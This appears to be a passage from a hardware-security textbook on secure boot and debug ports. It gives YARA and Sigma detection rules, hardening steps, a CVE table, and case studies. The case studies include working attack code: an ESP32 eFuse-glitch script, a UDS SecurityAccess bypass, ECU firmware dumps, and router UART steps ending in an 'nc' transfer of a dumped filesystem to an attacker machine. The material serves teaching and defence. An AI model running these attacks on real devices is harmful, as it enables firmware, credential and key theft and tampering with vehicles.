Detecting secure boot bypass, UEFI bootkits, and debug port tampering requires layered monitoring across the firmware, OS, and network levels. The following rules provide concrete detection capability.

**YARA rules for UEFI bootkit detection.** These rules scan the EFI System Partition and firmware images for known bootkit indicators. They should be run periodically on the ESP (typically mounted at `/boot/efi` on Linux or the `S:` volume on Windows forensic images) and on SPI flash dumps obtained during incident response.

```yaml
rule BlackLotus_UEFI_Bootkit {
    meta:
        description = "Detects BlackLotus UEFI bootkit artifacts on ESP"
        cve = "CVE-2022-21894"
        severity = "CRITICAL"

    strings:
        // BlackLotus dropper writes to ESP with these patterns
        $bcd_manip = { 42 00 43 00 44 00 00 00 ?? ?? ?? ?? 62 6F 6F 74 }
        // Self-signed certificate often uses these OID patterns
        $self_signed = { 30 82 ?? ?? 30 82 ?? ?? A0 03 02 01 02 }
        // Known BlackLotus PE header characteristics
        $pe_header = "MZ" ascii
        $bootkit_str1 = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi" wide
        $bootkit_str2 = "BCD00000001" wide
        // Baton Drop exploitation artifacts
        $baton_drop = { C7 44 24 ?? 00 00 00 00 E8 ?? ?? ?? ?? 85 C0 }

    condition:
        $pe_header at 0 and (2 of ($bcd_manip, $self_signed,
        $bootkit_str1, $bootkit_str2, $baton_drop))
}

rule Modified_GRUB_Binary {
    meta:
        description = "Detects GRUB2 binaries modified for BootHole exploit"
        cve = "CVE-2020-10713"
        severity = "HIGH"

    strings:
        $grub_magic = "GRUB" ascii
        // BootHole targets grub_parser_split_cmdline
        $vuln_func = "grub_parser_split_cmdline" ascii
        // Shellcode patterns commonly injected via BootHole
        $nop_sled = { 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 }
        $shellcode_sig = { 48 31 C0 48 89 C2 48 89 C6 48 8D 3D }

    condition:
        $grub_magic and ($nop_sled or $shellcode_sig)
}

rule Modified_Shim_Bootloader {
    meta:
        description = "Detects shimx64.efi with tampered MOK database"
        severity = "HIGH"

    strings:
        $shim_sig = ".vendor_cert" ascii
        $mok_manip = "MokListRT" wide
        // Shim normally contains the distro's embedded certificate
        // A modified shim may contain additional unauthorized certificates
        $extra_cert = { 30 82 ?? ?? 30 82 ?? ?? A0 03 02 01 02 02 01 }

    condition:
        $shim_sig and $mok_manip and #extra_cert > 2
}
```

**Sigma rules for Secure Boot state changes.** These rules detect Windows Event Log entries that indicate Secure Boot configuration has been modified — a strong indicator of bootkit activity or unauthorized firmware modification.

```yaml
title: Secure Boot Configuration Changed
id: a3c4e7d2-1b5f-4a9e-8c3d-2e7f1a6b4c8d
status: stable
description: >
    Detects changes to UEFI Secure Boot configuration variables (PK, KEK,
    db, dbx) which may indicate bootkit installation or firmware tampering.
logsource:
    product: windows
    service: system
detection:
    selection_secureboot_off:
        EventID: 1032
        Provider_Name: 'Microsoft-Windows-TPM-WMI'
    selection_variable_change:
        EventID:
            - 1033   # Secure Boot variable write
            - 1034   # Secure Boot policy change
    selection_boot_integrity:
        EventID: 12
        Provider_Name: 'Microsoft-Windows-Kernel-Boot'
        # Boot integrity validation failure
    condition: selection_secureboot_off or selection_variable_change
              or selection_boot_integrity
    level: critical
    falsepositives:
        - Legitimate firmware updates via Windows Update
        - OEM BIOS updates that modify Secure Boot keys
    tags:
        - attack.persistence
        - attack.t1542.003
```

```yaml
title: Boot Configuration Data Modification
id: b7d8e9f3-2c6a-4b1d-9e5f-3a8c2d7e6f1a
status: experimental
description: >
    Detects BCD store modifications that may indicate CVE-2022-21894
    (Baton Drop) exploitation used by BlackLotus.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4657  # Registry value modified
        ObjectName|contains:
            - 'BCD00000000'
            - 'bootmgfw'
    filter_windows_update:
        ProcessName|contains: 'TrustedInstaller'
    condition: selection and not filter_windows_update
    level: high
```

**Linux audit rules for firmware access.** These rules monitor access to EFI variables and firmware-related filesystem paths, detecting potential reconnaissance or modification by an attacker who has gained root access and is attempting to establish firmware-level persistence.

```bash
# /etc/audit/rules.d/90-secureboot.rules

# Monitor reads/writes to EFI variables (Secure Boot keys)
-w /sys/firmware/efi/efivars/ -p rwa -k efi_var_access
-w /sys/firmware/efi/vars/ -p rwa -k efi_var_access

# Monitor access to the EFI System Partition mount point
-w /boot/efi/ -p wa -k esp_modification

# Monitor flashrom and SPI flash tools
-w /usr/sbin/flashrom -p x -k flash_tool_exec
-w /usr/local/bin/flashrom -p x -k flash_tool_exec

# Monitor CHIPSEC execution
-w /usr/bin/chipsec_main -p x -k chipsec_exec
-w /usr/bin/chipsec_util -p x -k chipsec_exec

# Monitor mokutil (MOK key management)
-w /usr/bin/mokutil -p x -k mok_management

# Monitor efibootmgr (boot entry management)
-w /usr/sbin/efibootmgr -p x -k efi_boot_management

# Monitor direct access to SPI flash device nodes
-w /dev/mtd0 -p rw -k spi_flash_access
-w /dev/spidev0.0 -p rw -k spi_flash_access
```

**fwupd and CHIPSEC firmware integrity commands.** These tools provide runtime verification of firmware integrity and hardware security configuration.

```bash
# fwupd: check firmware security attributes
fwupdmgr security

# fwupd: verify firmware signatures against known-good metadata
fwupdmgr verify-update

# CHIPSEC: comprehensive platform security audit
sudo python3 chipsec_main.py --module common.secureboot.variables
sudo python3 chipsec_main.py --module common.uefi.access_uefispec
sudo python3 chipsec_main.py --module common.spi_lock
sudo python3 chipsec_main.py --module common.bios_wp
sudo python3 chipsec_main.py --module common.smm

# CHIPSEC: dump and verify Secure Boot variables
sudo python3 chipsec_util.py uefi var-list
sudo python3 chipsec_util.py uefi var-read PK \
    8BE4DF61-93CA-11D2-AA0D-00E098032B8C pk_dump.bin
```

**UEFI Secure Boot variable monitoring script.** This Python script reads the current Secure Boot variable state on a Linux host and compares it against a known-good baseline, alerting on unauthorized changes.

```python
import hashlib
import json
import os
import sys

EFIVARS_PATH = "/sys/firmware/efi/efivars"
MONITORED_VARS = [
    ("PK-8be4df61-93ca-11d2-aa0d-00e098032b8c", "Platform Key"),
    ("KEK-8be4df61-93ca-11d2-aa0d-00e098032b8c", "Key Exchange Key"),
    ("db-d719b2cb-3d3a-4596-a3bc-dad00e67656f", "Authorized Signatures"),
    ("dbx-d719b2cb-3d3a-4596-a3bc-dad00e67656f", "Forbidden Signatures"),
    ("SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c", "Secure Boot State"),
]

BASELINE_FILE = "/etc/secureboot_baseline.json"

def read_efi_var(var_name):
    """Read an EFI variable and return its SHA-256 hash."""
    path = os.path.join(EFIVARS_PATH, var_name)
    if not os.path.exists(path):
        return None
    with open(path, "rb") as f:
        data = f.read()
    # Skip the 4-byte attributes prefix
    return hashlib.sha256(data[4:]).hexdigest()

def check_baseline():
    """Compare current EFI variable state against baseline."""
    if not os.path.exists(BASELINE_FILE):
        print("[!] No baseline found. Run with --create-baseline first.")
        sys.exit(1)
    with open(BASELINE_FILE, "r") as f:
        baseline = json.load(f)

    alerts = []
    for var_name, description in MONITORED_VARS:
        current_hash = read_efi_var(var_name)
        baseline_hash = baseline.get(var_name)
        if current_hash != baseline_hash:
            alerts.append(
                f"ALERT: {description} ({var_name}) changed!\n"
                f"  Baseline: {baseline_hash}\n"
                f"  Current:  {current_hash}"
            )
    if alerts:
        for a in alerts:
            print(a)
        sys.exit(2)  # non-zero exit for monitoring integration
    else:
        print("[OK] All Secure Boot variables match baseline.")

def create_baseline():
    """Snapshot current EFI variable hashes as the known-good baseline."""
    baseline = {}
    for var_name, description in MONITORED_VARS:
        h = read_efi_var(var_name)
        baseline[var_name] = h
        print(f"  {description}: {h}")
    with open(BASELINE_FILE, "w") as f:
        json.dump(baseline, f, indent=2)
    print(f"[*] Baseline written to {BASELINE_FILE}")

if __name__ == "__main__":
    if "--create-baseline" in sys.argv:
        create_baseline()
    else:
        check_baseline()
```

**Hardware tamper detection for debug port access.** Physical indicators of debug port probing include: (1) solder residue or flux around test points (indicating probe wires were attached), (2) scratches on conformal coating near debug headers (indicating the coating was removed to access pads), (3) re-flow evidence on BGA or QFN packages (indicating the chip was removed for chip-off analysis, Chapter 17C §5.3), and (4) epoxy or potting compound damage (indicating physical bypass of a tamper-evident enclosure). Automated detection can use tamper-detection meshes (a PCB trace grid routed over the debug pads — breaking any trace triggers a tamper flag in a secure element), conductive epoxy monitoring (applying conductive epoxy over debug pads and monitoring continuity — removal triggers a tamper flag), and fuse-based tamper witnesses (a one-time-programmable fuse that is blown by the device's secure boot firmware on first boot — if the fuse is not blown, the device has been re-programmed or the boot sequence was interrupted).

### 7.8 Hardening configurations

This section provides step-by-step hardening procedures for the major secure boot ecosystems. Each procedure is a complete workflow suitable for production deployment.

**UEFI Secure Boot custom key enrollment with sbsign/mokutil.** Replacing the default Microsoft keys with organization-owned keys provides full control over what code is authorized to boot. This workflow generates a custom PK/KEK/db hierarchy and enrolls it on a Linux system.

```bash
# Generate the Platform Key (PK)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=My Platform Key/" \
        -keyout PK.key -out PK.crt -days 3650 -nodes -sha256

# Generate the Key Exchange Key (KEK)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=My KEK/" \
        -keyout KEK.key -out KEK.crt -days 3650 -nodes -sha256

# Generate the Signature Database key (db)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=My db Key/" \
        -keyout db.key -out db.crt -days 3650 -nodes -sha256

# Convert to EFI signature lists
cert-to-efi-sig-list -g "$(uuidgen)" PK.crt PK.esl
cert-to-efi-sig-list -g "$(uuidgen)" KEK.crt KEK.esl
cert-to-efi-sig-list -g "$(uuidgen)" db.crt db.esl

# Sign the EFI signature lists
sign-efi-sig-list -k PK.key -c PK.crt PK PK.esl PK.auth
sign-efi-sig-list -k PK.key -c PK.crt KEK KEK.esl KEK.auth
sign-efi-sig-list -k KEK.key -c KEK.crt db db.esl db.auth

# Sign the bootloader and kernel with the db key
sbsign --key db.key --cert db.crt --output /boot/efi/EFI/BOOT/BOOTX64.EFI \
       /boot/efi/EFI/BOOT/BOOTX64.EFI
sbsign --key db.key --cert db.crt --output /boot/vmlinuz-signed \
       /boot/vmlinuz

# Enroll keys via efi-updatevar (requires Secure Boot in Setup Mode)
efi-updatevar -e -f PK.esl PK
efi-updatevar -e -f KEK.esl KEK
efi-updatevar -e -f db.esl db

# Alternative: enroll via mokutil for shim-based systems
mokutil --import db.crt  # prompts for password, enrolled on next reboot
```

**Linux Lockdown LSM.** The Lockdown LSM restricts kernel capabilities that could undermine Secure Boot guarantees from userspace (even with root access). It prevents direct access to kernel memory (/dev/mem, /dev/kmem), module loading without valid signatures, kexec of unsigned kernels, and direct I/O port access.

```bash
# Enable via kernel command line (GRUB configuration)
# Edit /etc/default/grub:
GRUB_CMDLINE_LINUX="lockdown=confidentiality"

# Modes: integrity (blocks unsigned modules, /dev/mem)
#        confidentiality (additionally blocks hibernation, kprobes)

# Update GRUB and reboot
sudo update-grub
sudo reboot

# Verify lockdown is active
cat /sys/kernel/security/lockdown
# Expected output: none [integrity] confidentiality
# (brackets indicate current mode)
```

**dm-verity setup for verified boot on Linux.** dm-verity provides transparent integrity verification of block devices using a Merkle tree hash. When combined with Secure Boot (which verifies the kernel and initramfs), dm-verity extends the chain of trust to the root filesystem.

```bash
# Create the verity hash tree for the root filesystem
veritysetup format /dev/sda2 /dev/sda3
# Output includes the root hash — record this value:
# Root hash: 4a2e3f...

# Activate the verified device
veritysetup open /dev/sda2 verified-root /dev/sda3 \
    --root-hash=4a2e3f...

# Mount the verified filesystem
mount /dev/mapper/verified-root /mnt/verified

# For boot integration, embed the root hash in the kernel command line
# (which is itself signed via Secure Boot):
GRUB_CMDLINE_LINUX="root=/dev/dm-0 dm-mod.create=\"verified-root,,0,ro,\
0 $(blockdev --getsz /dev/sda2) verity 1 /dev/sda2 /dev/sda3 4096 4096 \
$(( $(blockdev --getsz /dev/sda2) / 8 )) 1 sha256 4a2e3f... \
0000000000000000000000000000000000000000000000000000000000000000\""
```

**Windows HVCI + Secure Boot + Credential Guard GPO settings.** These Group Policy settings enforce hardware-backed security on Windows 10/11 Enterprise systems. Deploy via Group Policy Object or Intune configuration profile.

```
Computer Configuration → Administrative Templates → System → Device Guard:

  Turn On Virtualization Based Security: Enabled
    Platform Security Level: Secure Boot and DMA Protection
    Virtualization Based Protection of Code Integrity: Enabled with UEFI lock
    Credential Guard Configuration: Enabled with UEFI lock
    Secure Launch Configuration: Enabled

Computer Configuration → Administrative Templates → System → Early Launch
Antimalware:

  Boot-Start Driver Initialization Policy: Good and unknown

Computer Configuration → Windows Settings → Security Settings → Local
Policies → Security Options:

  Interactive logon: Machine account lockout threshold: 10
```

The "UEFI lock" setting is critical: it prevents disabling HVCI or Credential Guard without physical access to the firmware settings (the setting is stored in a UEFI variable that cannot be modified from the OS). Without the UEFI lock, an attacker with administrative access can disable these protections via registry modification.

**Fuse programming best practices for production devices.** OTP fuse programming is the final, irreversible step in securing an embedded device. Errors in fuse programming can permanently brick devices (if the wrong fuse is blown) or leave them permanently vulnerable (if a security fuse is missed). The production checklist: (1) verify the fuse map against the SoC's datasheet, confirming the bit position and polarity of each security fuse, (2) program fuses in a controlled environment with ESD protection (fuse cells are sensitive to ESD damage during programming), (3) read back all fuses after programming to confirm the programmed values, (4) test debug lockout by attempting a SWD/JTAG connection after fuse programming (it should fail), (5) test secure boot by attempting to boot unsigned firmware (it should fail or be rejected), (6) record the fuse values in a secure database (for traceability — each device's fuse configuration should be auditable).

**Debug interface disabling checklist per platform.** The specific fuses and registers to program vary by platform. The following summarizes the critical settings for common embedded platforms.

For STM32 (all families): program RDP to Level 2 (permanent, irreversible — Level 1 is insufficient for high-security applications because it allows mass-erase downgrade). For nRF52 (Nordic): program APPROTECT in UICR to 0x00 (disabled), and on hardware-fixed revisions, additionally program the SECUREAPPROTECT register. For NXP i.MX: burn SEC_CONFIG to Closed mode, program the SRK hash fuses, and burn SRK_REVOKE fuses for any unused key slots. For ESP32: burn the JTAG_DISABLE, UART_DOWNLOAD_DIS, and ABS_DONE_1 (secure boot) eFuses. For Intel platforms: ensure Boot Guard is in Verified Boot mode (not measured-only) and the enforcement policy fuses are set. For RISC-V (implementation-dependent): enable debug authentication if supported by the implementation, or disable the DTM entirely via vendor-specific fuse.

---

## 8. CVE reference table

The following table maps critical CVEs referenced in this chapter to their affected platform, bypass type, CVSS v3.1 base score, and primary detection method.

| CVE | Platform | Bypass Type | CVSS | Detection |
|-----|----------|-------------|------|-----------|
| CVE-2019-8900 | Apple A5–A11 (iOS) | BootROM use-after-free (checkm8) | 7.5 | Physical inspection; not remotely detectable |
| CVE-2020-10713 | GRUB2 (Linux/UEFI) | Config parser buffer overflow (BootHole) | 8.2 | dbx revocation check; YARA on ESP |
| CVE-2022-21894 | Windows Boot Manager | BCD manipulation (Baton Drop / BlackLotus) | 4.4 | dbx check; PCR7 attestation; Sigma rules |
| CVE-2020-27211 | nRF52832/nRF52840 | APPROTECT voltage glitch bypass | 6.8 | Physical fuse verification; silicon revision check |
| CVE-2018-6242 | NVIDIA Tegra X1 | RCM USB stack overflow (Fusée Gelée) | 7.2 | Not remotely detectable; hardware revision |
| CVE-2020-0069 | MediaTek SoCs | BROM command injection | 7.8 | Kernel patch level verification |
| CVE-2018-18440 | U-Boot | FIT image signature bypass | 7.0 | Verified boot log analysis |
| CVE-2021-26311 | AMD PSP (Zen+) | PSP firmware buffer overflow | 7.2 | AMD firmware version check; fTPM attestation |
| CVE-2023-35818 | ESP32-S2 | Secure boot eFuse glitch bypass | 6.8 | eFuse readback verification |
| CVE-2019-0090 | Intel CSME | CSME BootROM vulnerability | 7.1 | CSME version audit; CHIPSEC |
| CVE-2023-24932 | Windows (Secure Boot) | Secure Boot bypass (BlackLotus v2) | 6.7 | May 2023 dbx update; Event ID 1032 monitoring |

---

## 9. Debug interface exploitation case studies

### 9.1 ESP32 JTAG/debug bypass: eFuse glitch exploitation

The Espressif ESP32 family protects its JTAG interface with the `JTAG_DISABLE` eFuse. When this fuse is burned, the internal JTAG TAP is electrically disconnected from the external pins, and the pins revert to GPIO function. The protection depends on a single eFuse read during the boot sequence — the BootROM reads the `JTAG_DISABLE` bit from the eFuse controller and, if set, gates off the JTAG multiplexer before any external interaction is possible.

Research by Raelize (2019–2020) and LimitedResults demonstrated that voltage glitching the eFuse controller during this read window causes the `JTAG_DISABLE` bit to read as 0 (not burned), re-enabling the JTAG interface on a production-fused device. The technique is closely related to the secure boot eFuse glitch documented in CVE-2023-35818 (§8) — both exploit the same eFuse controller read path, differing only in which fuse bit is targeted (JTAG_DISABLE vs ABS_DONE_1).

**Exploitation walkthrough.**

Equipment: ChipWhisperer-Husky (or equivalent sub-nanosecond glitcher), SOIC-8 clip or fine-pitch probe on the ESP32's VDD3P3 rail, OpenOCD with ESP32 target configuration, FTDI-based JTAG adapter (ESP-Prog or Olimex ARM-USB-OCD-H wired to ESP32 JTAG pins: GPIO12=TDI, GPIO13=TCK, GPIO14=TMS, GPIO15=TDO).

Phase 1 — Power trace profiling. Capture the ESP32's power consumption during the first 50 microseconds after reset release. The eFuse controller read generates a characteristic current spike (approximately 15–25 mA above baseline, lasting ~2 microseconds) as the eFuse sense amplifiers activate. This spike provides the timing reference for the glitch.

Phase 2 — Glitch parameter sweep. The glitch targets the VDD3P3 rail (the eFuse controller's supply). The glitch width is typically 5–20 nanoseconds, and the offset from reset release is within the 10–40 microsecond window identified in Phase 1. A systematic sweep over offset and width, with automated JTAG reconnection after each reset, identifies the successful parameter combination.

```python
# ESP32 JTAG_DISABLE eFuse glitch — ChipWhisperer-Husky
import chipwhisperer as cw
import subprocess, time

scope = cw.scope()
scope.clock.clkgen_freq = 240_000_000  # match ESP32 crystal
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"

ESP32_JTAG_PINS = "GPIO12=TDI,GPIO13=TCK,GPIO14=TMS,GPIO15=TDO"
OPENOCD_CMD = [
    "openocd", "-f", "interface/ftdi/olimex-arm-usb-ocd-h.cfg",
    "-f", "target/esp32.cfg",
    "-c", "init; halt; reg pc; shutdown"
]

attempts = 0
for offset in range(2000, 4500, 5):
    for width in range(3, 25, 2):
        scope.glitch.ext_offset = offset
        scope.glitch.repeat = width
        # Reset target via GPIO-controlled MOSFET on EN pin
        scope.io.nrst = 'low'
        time.sleep(0.01)
        scope.io.nrst = 'high'
        scope.arm()
        scope.capture()
        attempts += 1
        # Attempt JTAG connection
        result = subprocess.run(
            OPENOCD_CMD, capture_output=True, text=True, timeout=5
        )
        if "halted" in result.stdout.lower():
            print(f"[+] JTAG enabled at offset={offset} width={width}")
            print(f"    Attempts: {attempts}")
            # Dump full flash via JTAG
            subprocess.run([
                "openocd", "-f", "interface/ftdi/olimex-arm-usb-ocd-h.cfg",
                "-f", "target/esp32.cfg",
                "-c", "init; halt; flash read_image esp32_dump.bin 0x3F400000 0x400000; shutdown"
            ])
            raise SystemExit(0)

print(f"[-] No bypass found after {attempts} attempts")
```

Phase 3 — Post-bypass exploitation. Once JTAG is re-enabled, the attacker has full CoreSight-level access to both Xtensa LX6 cores. Key actions: dump the entire SPI flash (including NVS partition containing Wi-Fi credentials, TLS private keys, and application secrets), read eFuse values (to extract the secure boot key hash and flash encryption key — though the latter is stored in a read-protected eFuse block on newer revisions), set hardware breakpoints in the secure boot verification code for future analysis, and modify firmware in flash to install a persistent backdoor.

The ESP32-S2, ESP32-S3, and ESP32-C3 have improved eFuse controller designs with redundant reads and glitch detection, but CVE-2023-35818 demonstrated that the ESP32-S2 remained vulnerable to a more precisely timed glitch. The ESP32-C6 and ESP32-H2 (RISC-V based) incorporate additional brownout detection on the eFuse supply rail.

### 9.2 PlayStation and Xbox debug port exploitation history

**PlayStation 3 — JTAG/debug exploit chain (2010).** The PS3's Cell Broadband Engine (PPE + 6 SPE cores) exposes a JTAG interface on the motherboard. Early PS3 motherboards (COK-001 through DIA-002) have accessible JTAG test points near the Cell processor. In 2010, the PSJailbreak team demonstrated that a combination of USB descriptor exploitation (to gain initial code execution in the Lv2 hypervisor) and JTAG access (to patch the hypervisor's signature verification in SRAM) enabled running unsigned code. The JTAG portion of the attack involved: soldering wires to the NAND flash's SPI bus and the Cell's JTAG test points, dumping the NAND (which contains the encrypted bootloader chain: bootldr → metldr → lv0 → lv1 → lv2), patching the lv2 hypervisor to disable signature checks on loaded binaries, and reflashing the modified NAND. Sony's response in firmware 3.56+ was to revoke the compromised metldr key and implement a new chain of trust — but the leak of Sony's ECDSA private key (the `ps3 fail0verflow` incident, where the random nonce `k` was reused across signatures, allowing private key recovery) rendered software-only mitigations insufficient. Hardware revisions (CECH-3000+ "Super Slim") removed the accessible JTAG test points and added additional hardware checks.

**PlayStation 4 — Aeolia bridge chip debug.** The PS4's Aeolia southbridge (a Marvell ARM-based SoC) handles system management, including the boot sequence supervision. Security researchers (including SpecterDev and fail0verflow) identified UART and SWD test points on the Aeolia chip. The UART provided boot log output revealing the Aeolia's boot stages and error conditions. SWD access to the Aeolia enabled dumping its firmware (the `sflash0` image), which contained the southbridge's boot chain and cryptographic key material used to decrypt the main x86 APU's firmware. This was not a JTAG bypass per se — the Aeolia's debug interface was simply never properly disabled on production units, a common oversight where secondary processors on an SoC are hardened less rigorously than the main application processor.

**Xbox 360 — JTAG hack (2007–2009).** The Xbox 360's Xenon CPU has JTAG test points on the motherboard. The "JTAG hack" (also called the "SMC hack") exploited a vulnerability in the Xbox 360's hypervisor (HV) combined with JTAG access to the NAND flash. The exploit chain: (1) use the King Kong game disc to trigger a specific hypervisor bug (a timing-dependent privilege escalation in the HV's memory comparison routine), (2) while the HV is in the vulnerable state, use JTAG to write a payload to a specific NAND address that the HV will load as a configuration block, (3) on next boot, the HV loads the crafted configuration block, which redirects execution to a custom payload. Microsoft's response was the eFuse-based anti-rollback system: each dashboard update incremented a hardware fuse counter, preventing downgrade to the vulnerable HV version. However, the "RGH" (Reset Glitch Hack) later bypassed the eFuse check through voltage glitching of the Xenon's reset line (see Chapter 17B for glitch methodology).

**Xbox One and Series X — security improvements.** Microsoft's later consoles implemented hardware-enforced debug lockout: the Xbox One's custom AMD APU has the JTAG TAP permanently disabled via fuses burned during manufacturing (the JTAG_DIS fuse in the APU's OTP bank). The debug interface requires a Microsoft-signed debug certificate presented through a secure debug protocol (analogous to ARM's Secure Debug Channel). No public bypass has been demonstrated on the Xbox One or Xbox Series X debug interfaces as of early 2025.

### 9.3 Automotive ECU debug interface abuse

Modern vehicles contain 50–150 ECUs (Electronic Control Units) interconnected via CAN bus, CAN-FD, LIN, FlexRay, and Ethernet. Many ECUs expose debug interfaces (JTAG, SWD, or BDM for older Freescale/NXP PowerPC-based ECUs) that are accessible once the ECU's enclosure is opened. More critically, some ECUs expose debug functionality through the vehicle's diagnostic interface — the OBD-II port, which provides CAN bus access to all ECUs on the vehicle's network.

**CAN-connected debug bridges.** Some automotive ECUs implement a CAN-to-debug bridge: a diagnostic protocol (typically UDS — Unified Diagnostic Services, ISO 14229) that provides memory read/write, register access, and firmware upload capabilities over the CAN bus. The UDS `ReadMemoryByAddress` (0x23) and `WriteMemoryByAddress` (0x3D) services, when improperly secured, provide the functional equivalent of JTAG memory access — without physical access to the ECU's PCB. The `RequestDownload` (0x34) and `TransferData` (0x36) services enable firmware upload.

The security gate for UDS debug services is the `SecurityAccess` (0x27) service, which implements a challenge-response authentication. In practice, many automotive OEMs use weak implementations: fixed seed values (the challenge is deterministic or drawn from a small set), algorithmic keys derived from the seed using a reversible function (the key derivation algorithm is extracted from the ECU firmware and reimplemented in an attacker tool), or no security access required at all for memory read services (the ECU responds to ReadMemoryByAddress without prior authentication).

```python
# Automotive ECU UDS SecurityAccess bypass — python-can + udsoncan
import can
import udsoncan
from udsoncan.connections import PythonIsoTpConnection
from udsoncan.client import Client
from udsoncan.configs import default_client_config
import isotp

# CAN interface setup (SocketCAN on Linux with PEAK PCAN-USB adapter)
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)

# ISO-TP layer for UDS (transport protocol for messages >8 bytes)
tp_layer = isotp.CanStack(
    bus=bus,
    address=isotp.Address(
        addressing_mode=isotp.AddressingMode.Normal_11bits,
        txid=0x7E0,  # ECU request ID (varies by ECU)
        rxid=0x7E8   # ECU response ID
    )
)
conn = PythonIsoTpConnection(tp_layer)

config = default_client_config.copy()
config['security_algo'] = None  # will be set after seed extraction

with Client(conn, config=config) as client:
    # Step 1: Enter extended diagnostic session
    client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)

    # Step 2: Request security seed (sub-function 0x01 = requestSeed)
    response = client.request_seed(access_type=0x01)
    seed = response.service_data.seed
    print(f"[*] Received seed: {seed.hex()}")

    # Step 3: Compute key from seed
    # (Algorithm extracted from ECU firmware RE — example: XOR-rotate)
    def compute_key(seed_bytes):
        """Example weak key derivation — real implementations vary."""
        key = bytearray(len(seed_bytes))
        magic = 0xCAFEBABE
        for i, b in enumerate(seed_bytes):
            key[i] = ((b ^ (magic >> (8 * (i % 4)))) + 0x55) & 0xFF
        return bytes(key)

    key = compute_key(seed)
    print(f"[*] Computed key: {key.hex()}")

    # Step 4: Send computed key (sub-function 0x02 = sendKey)
    client.send_key(access_type=0x02, key=key)
    print("[+] SecurityAccess granted")

    # Step 5: Read ECU memory (firmware dump)
    # ReadMemoryByAddress: start=0x00000000, length=0x80000 (512KB)
    data = client.read_memory_by_address(
        memory_location=udsoncan.MemoryLocation(
            address=0x00000000, memorysize=0x1000,
            address_format=32, memorysize_format=16
        )
    )
    print(f"[+] Read {len(data.service_data)} bytes from ECU memory")
```

**Real-world automotive debug exploitation.** In 2015, Charlie Miller and Chris Valasek demonstrated remote exploitation of a 2014 Jeep Cherokee via the Uconnect infotainment system's cellular connection (CVE-2015-5611). The attack chain reached the CAN bus through the infotainment unit's CAN gateway, and from there sent diagnostic (UDS) commands to safety-critical ECUs including the transmission controller and braking system. While the initial vector was a network exploit (not a debug interface), the final payload delivery to ECUs used UDS diagnostic services — illustrating how CAN-connected debug functionality extends the attack surface from physical to remote.

In 2020, researchers at Argus Cyber Security and Tencent Keen Security Lab independently demonstrated extraction of firmware from multiple Tier-1 supplier ECUs (Continental, Bosch, Denso) using combinations of JTAG access (after decapping the ECU enclosure) and UDS SecurityAccess bypass (using key derivation algorithms extracted from the dumped firmware). The extracted firmware revealed hardcoded cryptographic keys shared across entire vehicle model lines — a single key extraction enables flashing modified firmware onto any vehicle of the same model.

**BDM (Background Debug Mode) on legacy automotive ECUs.** Older automotive ECUs based on Freescale (now NXP) MPC5xx/SPC5xx PowerPC microcontrollers use BDM instead of JTAG for debug access. BDM provides single-wire serial debug through a dedicated BKPT (breakpoint) pin. The BDM protocol supports memory read/write, register access, and flash programming. Tools: PEmicro Multilink and Lauterbach TRACE32 are the standard commercial BDM debuggers. BDM interfaces on production ECUs are rarely disabled because the automotive industry relies on them for post-production diagnostics, calibration, and ECU reflashing at dealerships. An attacker with physical access to the ECU PCB can connect a BDM probe and extract the complete firmware, calibration data, and cryptographic key material.

```bash
# OpenOCD BDM connection to MPC5674F (common automotive PowerPC ECU)
openocd -f interface/ftdi/olimex-arm-usb-ocd-h.cfg \
        -f target/mpc5674f.cfg \
        -c "init" \
        -c "halt" \
        -c "dump_image ecu_firmware.bin 0x00000000 0x200000" \
        -c "dump_image ecu_calibration.bin 0x00FC0000 0x40000" \
        -c "shutdown"
```

### 9.4 IoT device UART/JTAG discovery and exploitation

**Router exploitation — UART shell access.** Consumer and enterprise routers are among the most commonly exploited IoT targets via debug interfaces. The typical attack proceeds: (1) open the enclosure (most router enclosures use snap-fit plastic or Phillips screws with no tamper-evident seals), (2) identify the UART header — most routers have a 4-pin header (VCC, TX, RX, GND) populated during manufacturing for factory test and never depopulated, (3) connect a USB-UART adapter (CP2102, CH340, FTDI FT232R) at 115200 baud (the most common baud rate; alternatives: 9600, 57600, 921600), (4) observe the boot log — U-Boot, the Linux kernel boot messages, and often a root shell prompt with no authentication.

```bash
# Router UART interaction — typical discovery and exploitation
# Step 1: identify UART pins with a multimeter
# GND: continuity to ground plane / shield
# VCC: steady 3.3V (do NOT connect — just identify)
# TX:  fluctuates during boot (data output from router)
# RX:  steady high (3.3V pull-up) — data input to router

# Step 2: connect USB-UART adapter (TX↔RX crossover)
# Adapter TX → Router RX
# Adapter RX → Router TX
# Adapter GND → Router GND

# Step 3: open serial console
screen /dev/ttyUSB0 115200

# Step 4: if no prompt appears, try interrupting U-Boot
# (press a key during the U-Boot countdown — typically 1-3 seconds)
# Common U-Boot interrupt keys: Enter, space, any key, 'tpl'

# Step 5: from U-Boot prompt, extract firmware
# U-Boot> printenv          # show environment variables (flash layout)
# U-Boot> md 0x9F000000 100 # read SPI flash base address (varies)
# U-Boot> nand read 0x80000000 0x0 0x800000  # read NAND to RAM
# U-Boot> tftpput 0x80000000 0x800000 192.168.1.2:firmware.bin

# Step 6: from Linux root shell (if presented)
cat /proc/mtd              # flash partition layout
dd if=/dev/mtd0 of=/tmp/bootloader.bin
dd if=/dev/mtd1 of=/tmp/kernel.bin
dd if=/dev/mtd2 of=/tmp/rootfs.bin
# Transfer via tftp, nc, or wget to attacker machine
nc -w3 192.168.1.2 4444 < /tmp/rootfs.bin
```

